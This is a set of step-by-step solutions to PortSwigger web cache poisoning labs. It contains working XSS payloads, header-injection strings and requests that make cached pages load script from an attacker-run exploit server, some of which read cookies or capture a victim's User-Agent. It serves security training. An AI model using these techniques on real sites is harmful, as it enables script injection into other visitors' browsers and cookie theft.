# Web cache poisoning

## Web cache poisoning with an unkeyed header

### Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header) is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page.

### Proof of concept

1. With Burp running, load the website's home page
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the GET request for the home page and send it to Burp Repeater.
3. Add a cache-buster query parameter, such as ?cb=1234.
4. Add the ``X-Forwarded-Host`` header with an arbitrary hostname, such as ``example.com``, and send the request.
5. Observe that the X-Forwarded-Host header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at ``/resources/js/tracking.js``.
6. Replay the request and observe that the response contains the header ``X-Cache: hit``. This tells us that the response came from the cache.
7. Go to the exploit server and change the file name to match the path used by the vulnerable response:

```text
/resources/js/tracking.js
```

8. In the body, enter the payload alert(document.cookie) and store the exploit.
9. Open the GET request for the home page in Burp Repeater and remove the cache buster.
10. Add the following header, remembering to enter your own exploit server ID:

```text
X-Forwarded-Host: your-exploit-server-id.web-security-academy.net
```

11. Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and X-Cache: hit in the headers.
12. To simulate the victim, load the poisoned URL in your browser and make sure that the `alert()` is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds.
13. If the lab is still not solved, the victim did not access the page while the cache was poisoned. Keep sending the request every few seconds to re-poison the cache until the victim is affected and the lab is solved.

### Exploitability

An attacker will need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser. 

----

## Web cache poisoning with an unkeyed cookie

### Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie) is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page.

### Proof of concept

1. With Burp running, load the website's home page.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Notice that the first response you received sets the cookie ``fehost=prod-cache-01``.
3. Reload the home page and observe that the value from the ``fehost`` cookie is reflected inside a double-quoted JavaScript object in the response.
4. Send this request to Burp Repeater and add a cache-buster query parameter.
5. Change the value of the cookie to an arbitrary string and resend the request. Confirm that this string is reflected in the response.
6. Place a suitable XSS payload in the ``fehost`` cookie, for example:

```text
fehost=someString"-alert(1)-"someString
```

7. Replay the request until you see the payload in the response and ``X-Cache: hit`` in the headers.
8. Load the URL in your browser and confirm the ``alert()`` fires.
9. Go back Burp Repeater, remove the cache buster, and replay the request to keep the cache poisoned until the victim visits the site and the lab is solved.

### Exploitability

An attacker will need to poison the cache with a response that executes `alert(1)` in the visitor's browser. 

----

## Web cache poisoning with multiple headers

### Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers) contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute.

### Proof of concept

1. With Burp running, load the website's home page.
2. Go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the ``GET`` request for the JavaScript file ``/resources/js/tracking.js`` and send it to Burp Repeater.
3. Add a cache-buster query parameter and the X-Forwarded-Host header with an arbitrary hostname, such as example.com. Notice that this doesn't seem to have any effect on the response.
4. Remove the ``X-Forwarded-Host`` header and add the ``X-Forwarded-Scheme`` header instead. Notice that if you include any value other than HTTPS, you receive a 302 response. The Location header shows that you are being redirected to the same URL that you requested, but using https://.
5. Add the X-Forwarded-Host: example.com header back to the request, but keep ``X-Forwarded-Scheme: nothttps`` as well. Send this request and notice that the ``Location`` header of the 302 redirect now points to ``https://example.com/``.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response:

```text
/resources/js/tracking.js
```

7. In the body, enter the payload alert(document.cookie) and store the exploit.
8. Go back to the request in Burp Repeater and set the X-Forwarded-Host header as follows, remembering to enter your own exploit server ID:

```text
X-Forwarded-Host: your-exploit-server-id.web-security-academy.net
```

9. Make sure the ``X-Forwarded-Scheme`` header is set to anything other than ``HTTPS``.
10. Send the request until you see your exploit server URL reflected in the response and ``X-Cache: hit`` in the headers.
11. To check that the response was cached correctly, right-click on the request in Burp, select "Copy URL", and load this URL in your browser. If the cache was successfully poisoned, you will see the script containing your payload, ``alert(document.cookie)``. Note that the ``alert()`` won't actually execute here.
12. Go back to Burp Repeater, remove the cache buster, and resend the request until you poison the cache again.
13. To simulate the victim, reload the home page in your browser and make sure that the ``alert()`` fires.
14. Keep replaying the request to keep the cache poisoned until the victim visits the site and the lab is solved.

### Exploitability

An attacker will need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser. 

----

## Targeted web cache poisoning using an unknown header

### Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header) is vulnerable to web cache poisoning. A victim user will view any comments that you post.

### Proof of concept

1. With Burp running, load the website's home page.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the ``GET`` request for the home page.
3. With the Param Miner extension enabled, right-click on the request and select "Guess headers". After a while, Param Miner will report that there is a secret input in the form of the ``X-Host`` header.
4. Send the ``GET`` request to Burp Repeater and add a cache-buster query parameter.
5. Add the ``X-Host`` header with an arbitrary hostname, such as example.com. Notice that the value of this header is used to dynamically generate an absolute URL for importing the JavaScript file stored at ``/resources/js/tracking.js``.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response:

```text
/resources/js/tracking.js
```

7. In the body, enter the payload ``alert(document.cookie)`` and store the exploit.
8. Go back to the request in Burp Repeater and set the X-Host header as follows, remembering to add your own exploit server ID:

```text
X-Host: your-exploit-server-id.web-security-academy.net
```

9. Send the request until you see your exploit server URL reflected in the response and ``X-Cache: hit`` in the headers.
10. To simulate the victim, load the URL in your browser and make sure that the ``alert()`` fires.
11. Notice that the ``Vary`` header is used to specify that the ``User-Agent`` is part of the cache key. To target the victim, you need to find out their ``User-Agent``.
12. On the website, notice that the comment feature allows certain HTML tags. Post a comment containing a suitable payload to cause the victim's browser to interact with your exploit server, for example:

```text
<img src="https://your-exploit-server-id.web-security-academy.net/foo" />
```

13. Go to the blog page and double-check that your comment was successfully posted.
14. Go to the exploit server and click the button to open the "Access log". Refresh the page every few seconds until you see requests made by a different user. This is the victim. Copy their ``User-Agent`` from the log.
15. Go back to your malicious request in Burp Repeater and paste the victim's ``User-Agent`` into the corresponding header. Remove the cache buster.
16. Keep sending the request until you see your exploit server URL reflected in the response and ``X-Cache: hit`` in the headers.
17. Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved

### Exploitability

An attacker will need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser; and also needs to make sure that the response is served to the specific subset of users to which the intended victim belongs. 

----

## Web cache poisoning via an unkeyed query string

### Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query) is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome. 

### Proof of concept

1. With Burp running, load the website's home page. In Burp, go to "Proxy" > "HTTP history". Find the ``GET`` request for the home page. Notice that this page is a potential cache oracle. Send the request to Burp Repeater.
2. Add arbitrary query parameters to the request. Observe that you can still get a cache hit even if you change the query parameters. This indicates that they are not included in the cache key.
3. Notice that you can use the ``Origin`` header as a cache buster. Add it to your request.
4. When you get a cache miss, notice that your injected parameters are reflected in the response. If the response to your request is cached, you can remove the query parameters and they will still be reflected in the cached response.
5. Add an arbitrary parameter that breaks out of the reflected string and injects an XSS payload:

```text
GET /?evil='/><script>alert(1)</script>
```

6. Keep replaying the request until you see your payload reflected in the response and ``X-Cache: hit`` in the headers.
7. To simulate the victim, remove the query string from your request and send it again (while using the same cache buster). Check that you still receive the cached response containing your payload.
8. Remove the cache-buster ``Origin`` header and add your payload back to the query string. Replay the request until you have poisoned the cache for normal users. Confirm this attack has been successful by loading the home page in your browser and observing the popup.
9. The lab will be solved when the victim user visits the poisoned home page. You may need to re-poison the cache if the lab is not solved after 35 seconds.

### Exploitability

An attacker will need to poison the home page with a response that executes alert(1) in the victim's browser.

----

## Web cache poisoning via an unkeyed query parameter

### Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param) is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome. 

### Proof of concept

1. Observe that the home page is a suitable cache oracle. Notice that you get a cache miss whenever you change the query string. This indicates that it is part of the cache key. Also notice that the query string is reflected in the response.
2. Add a cache-buster query parameter.
3. Use Param Miner's "Guess GET parameters" feature to identify that the parameter ``utm_content`` is supported by the application.
4. Confirm that this parameter is unkeyed by adding it to the query string and checking that you still get a cache hit. Keep sending the request until you get a cache miss. Observe that this unkeyed parameter is also reflected in the response along with the rest of the query string.
5. Send a request with a ``utm_content`` parameter that breaks out of the reflected string and injects an XSS payload:

```text
GET /?utm_content='/><script>alert(1)</script>
```

6. Once your payload is cached, remove the ``utm_content`` parameter, right-click on the request, and select "Copy URL". Open this URL in your browser and check that the ``alert()`` is triggered when you load the page.
7. Remove your cache buster, re-add the ``utm_content`` parameter with your payload, and replay the request until the cache is poisoned for normal users. The lab will be solved when the victim user visits the poisoned home page

### Exploitability

An attacker will need to poison the cache with a response that executes `alert(1)` in the victim's browser. 

----

## Parameter cloaking

### Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking) is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome. 

### Proof of concept

1. Identify that the ``utm_content`` parameter is supported. Observe that it is also excluded from the cache key.
2. Notice that if you use a semicolon (;) to append another parameter to utm_content, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key. Alternatively, with Param Miner loaded, right-click on the request and select "Bulk scan" > "Rails parameter cloaking scan" to identify the vulnerability automatically.
3. Observe that every page imports the script ``/js/geolocate.js``, executing the callback function ``setCountryCookie()``. Send the request ``GET /js/geolocate.js?callback=setCountryCookie`` to Burp Repeater.
4. Notice that you can control the name of the function that is called on the returned data by editing the ``callback`` parameter. However, you can't poison the cache for other users in this way because the parameter is keyed.
5. Study the cache behaviour. Observe that if you add duplicate ``callback`` parameters, only the final one is reflected in the response, but both are still keyed. However, if you append the second ``callback`` parameter to the ``utm_content`` parameter using a semicolon, it is excluded from the cache key and still overwrites the callback function in the response:

```text
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({"country" : "United Kingdom"})
```

6. Send the request again, but this time pass in alert(1) as the callback function:

```text
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

7. Get the response cached, then load the home page in your browser. Check that the alert() is triggered.
8. Replay the request to keep the cache poisoned. The lab will solve when the victim user visits any page containing this resource import URL.

### Exploitability

An attacker will need to use the parameter cloaking technique to poison the cache with a response that executes `alert(1)` in the victim's browser. 

----

## Web cache poisoning via a fat GET request

### Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get) is vulnerable to web cache poisoning. It accepts `GET` requests that have a body, but does not include the body in the cache key. A user regularly visits this site's home page using Chrome. 

### Proof of concept

1. Observe that every page imports the script ``/js/geolocate.js``, executing the callback function ``setCountryCookie()``. Send the request ``GET /js/geolocate.js?callback=setCountryCookie`` to Burp Repeater.
2. Notice that you can control the name of the function that is called in the response by passing in a duplicate ``callback`` parameter via the request body. Also notice that the cache key is still derived from the original ``callback`` parameter in the request line:

```text
GET /js/geolocate.js?callback=setCountryCookie
…
callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({"country" : "United Kingdom"})
```

3. Send the request again, but this time pass in ``alert(1)`` as the callback function. Check that you can successfully poison the cache.
4. Remove any cache busters and re-poison the cache. The lab will solve when the victim user visits any page containing this resource import URL.

### Exploitability

An attacker will need to poison the cache with a response that executes `alert(1)` in the victim's browser. 

----

## URL normalization

### Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization) contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding. 

### Proof of concept

1. In Burp Repeater, browse to any non-existent path, such as ``GET /random``. Notice that the path you requested is reflected in the error message.
2. Add a suitable reflected XSS payload to the request line:

```text
GET /random</p><script>alert(1)</script><p>foo
```

3. Notice that if you request this URL in your browser, the payload doesn't execute because it is URL-encoded.
4. In Burp Repeater, poison the cache with your payload and then immediately load the URL in your browser. This time, the ``alert()`` is executed because your browser's encoded payload was URL-decoded by the cache, causing a cache hit with the earlier request.
5. Re-poison the cache then immediately go to the lab and click "Deliver link to victim". Submit your malicious URL. The lab will be solved when the victim visits the link.

### Exploitability

An attacker will need to take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute `alert(1)` in the victim's browser. Then, deliver the malicious URL to the victim. 

----

## Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

### Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria) contains a DOM-based vulnerability that can be exploited as part of a web cache poisoning attack. A user visits the home page roughly once a minute. The cache used by this lab has stricter criteria for deciding which responses are cacheable, so a study of the cache behaviour is necessary. 

### Proof of concept

1. With Burp running, open the website's home page.
2. In Burp, go to **Proxy -> "HTTP history** and study the requests and responses that you generated. Find the `GET` request for the home page and send it to Burp Repeater.
3. Use [Param Miner](https://portswigger.net/web-security/web-cache-poisoning#param-miner) to identify that the `X-Forwarded-Host` header is supported.
4. Add a cache buster to the request, as well as the `X-Forwarded-Host` header with an arbitrary hostname, such as `example.com`. Notice that this header overwrites the `data.host` variable, which is passed into the `initGeoLocate()` function.
5. Study the `initGeoLocate()` function in `/resources/js/geolocate.js` and notice that it is vulnerable to DOM-XSS due to the way it handles the incoming JSON data.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response:

```text
/resources/json/geolocate.json
```
    
7. In the head, add the header `Access-Control-Allow-Origin: *` to enable CORS.
8. In the body, add a malicious JSON object that matches the one used by the vulnerable website. However, replace the value with a suitable XSS payload, for example:

```text
{
"country": "<img src=1 onerror=alert(document.cookie) />"
}
```

9. **Store** the exploit.
10. Back in Burp, find the request for the home page and send it to Burp Repeater.
11. In Burp Repeater, add the following header, remembering to enter your own exploit server ID:

```text
X-Forwarded-Host: exploit-server-id.exploit-server.net
```
    
12. Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.
13. If this doesn't work, notice that the response contains the Set-Cookie header. Responses containing this header are not cacheable on this site. Reload the home page to generate a new request, which should have a session cookie already set.
14. Send this new request to Burp Repeater and repeat the steps above until you successfully poison the cache.
15. To simulate the victim, load the URL in the browser and make sure that the alert() fires.
16. Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved.

### Exploitability

An attacker will need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser. 

----

## Combining web cache poisoning vulnerabilities

### Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities) is susceptible to web cache poisoning, but only if you construct a complex exploit chain. A user visits the home page roughly once a minute and their language is set to English. 

### Proof of concept

1. With Burp running, load the website's home page.
2. Use [Param Miner](https://portswigger.net/web-security/web-cache-poisoning#param-miner) to identify that the `X-Forwarded-Host` and `X-Original-URL` headers are supported.
3. In Burp Repeater, experiment with the `X-Forwarded-Host` header and observe that it can be used to import an arbitrary JSON file instead of the `translations.json` file, which contains translations of UI texts.
4. Notice that the website is vulnerable to DOM-XSS due to the way the `initTranslations()` function handles data from the JSON file for all languages except English.
5. Go to the exploit server and edit the file name to match the path used by the vulnerable website:

```html
/resources/json/translations.json
```
    
6. In the head, add the header `Access-Control-Allow-Origin: *` to enable CORS.
7. In the body, add malicious JSON that matches the structure used by the real translation file. Replace the value of one of the translations with a suitable XSS payload, for example:

```text
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
            "Description:": "Descripción"
        }
    }
}
```

8. For the rest of this solution we will use Spanish to demonstrate the attack. Please note that if you injected your payload into the translation for another language, you will also need to adapt the examples accordingly.
    Store the exploit.
9. In Burp, find a `GET` request for `/?localized=1` that includes the lang cookie for Spanish:
    `lang=es`
10. Send the request to Burp Repeater. Add a cache buster and the following header, remembering to enter your own exploit server ID:

```text
X-Forwarded-Host: exploit-server-id.exploit-server.net
```
    
11. Send the response and confirm that your exploit server is reflected in the response.
12. To simulate the victim, load the URL in the browser and confirm that the `alert()` fires.
13. You have successfully poisoned the cache for the Spanish page, but the target user's language is set to English. As it's not possible to exploit users with their language set to English, you need to find a way to forcibly change their language.
14. In Burp, go to **Proxy -> HTTP history** and study the requests and responses that you generated. Notice that when you change the language on the page to anything other than English, this triggers a redirect, for example, to `/setlang/es`. The user's selected language is set server side using the `lang=es` cookie, and the home page is reloaded with the parameter `?localized=1`.
15. Send the GET request for the home page to Burp Repeater and add a cache buster.
16. Observe that the `X-Original-URL` can be used to change the path of the request, so you can explicitly set `/setlang/es`. However, you will find that this response cannot be cached because it contains the `Set-Cookie` header.
17. Observe that the home page sometimes uses backslashes as a folder separator. Notice that the server normalizes these to forward slashes using a redirect. Therefore, `X-Original-URL: /setlang\es` triggers a `302` response that redirects to `/setlang/es`. Observe that this `302` response is cacheable and, therefore, can be used to force other users to the Spanish version of the home page.
18. You now need to combine these two exploits. First, poison the `GET /?localized=1` page using the `X-Forwarded-Host` header to import your malicious JSON file from the exploit server.
19. Now, while the cache is still poisoned, also poison the `GET / page` using `X-Original-URL: /setlang\es` to force all users to the Spanish page.
20. To simulate the victim, load the English page in the browser and make sure that you are redirected and that the `alert()` fires.
21. Replay both requests in sequence to keep the cache poisoned on both pages until the victim visits the site and the lab is solved.

### Exploitability

An attacker will need to poison the cache with multiple malicious responses simultaneously and coordinate this with the victim's browsing behaviour.  

----

## Cache key injection

### Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection) contains multiple independent vulnerabilities, including cache key injection. A user regularly visits this site's home page using Chrome. 

### Proof of concept

1. Observe that the redirect at `/login` excludes the parameter `utm_content` from the cache key using a flawed regex. This allows appending arbitrary unkeyed content to the lang parameter:

```text
/login?lang=en?utm_content=anything
```

2. Observe that the page at `/login/` has an import from `/js/localize.js`. This is vulnerable to client-side parameter pollution via the `lang` parameter because it doesn't URL-encode the value.
3. Observe that the login page references an endpoint at `/js/localize.js` that is vulnerable to response header injection via the `Origin` request header, provided the `cors` parameter is set to `1`.
4. Use the `Pragma: x-get-cache-key` header to identify that the server is vulnerable to cache key injection, meaning the header injection can be triggered via a crafted URL.
5. Combine these four behaviours by poisoning the cache with following two requests:

```text
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
```

```text
GET /login?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/1.1
```

6. This will poison `/login?lang=en` such that it redirects to a login page with a poisoned localization import that executes `alert(1)`, solving the lab.

### Exploitability

An attacker will need to combine the vulnerabilities to execute `alert(1)` in the victim's browser. and make use of the `Pragma: x-get-cache-key` header in order to solve this lab. 

----

## Internal cache poisoning

### Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal) is vulnerable to web cache poisoning. It uses multiple layers of caching. A user regularly visits this site's home page using Chrome.

### Proof of concept

1. Notice that the home page is a suitable cache oracle and send the `GET /` request to Burp Repeater.
2. Observe that any changes to the query string are always reflected in the response. This indicates that the external cache includes this in the cache key. Use Param Miner to add a dynamic cache-buster query parameter. This will allow you to bypass the external cache.
3. Observe that the `X-Forwarded-Host` header is supported. Add this to your request, containing your exploit server URL:

```text
X-Forwarded-Host: exploit-server-id.exploit-server.net
```
    
4. Send the request. If you get lucky with your timing, you will notice that your exploit server URL is reflected three times in the response. However, most of the time, you will see that the URL for the canonical link element and the `analytics.js` import now both point to your exploit server, but the `geolocate.js` import URL remains the same.
5. Keep sending the request. Eventually, the URL for the `geolocate.js` resource will also be overwritten with your exploit server URL. This indicates that this fragment is being cached separately by the internal cache. Notice that you've been getting a cache hit for this fragment even with the cache-buster query parameter - the query string is unkeyed by the internal cache.
6. Remove the `X-Forwarded-Host` header and resend the request. Notice that the internally cached fragment still reflects your exploit server URL, but the other two URLs do not. This indicates that the header is unkeyed by the internal cache but keyed by the external one. Therefore, you can poison the internally cached fragment using this header.
7. Go to the exploit server and create a file at `/js/geolocate.js` containing the payload `alert(document.cookie)`. Store the exploit.
8. Back in Burp Repeater, disable the dynamic cache buster in the query string and re-add the `X-Forwarded-Host` header to point to your exploit server.
9. Send the request over and over until all three of the dynamic URLs in the response point to your exploit server. Keep replaying the request to keep the cache poisoned until the victim user visits the page and the lab is solved.

### Exploitability

An attacker will need to poison the internal cache so that the home page executes `alert(document.cookie)` in the victim's browser. 



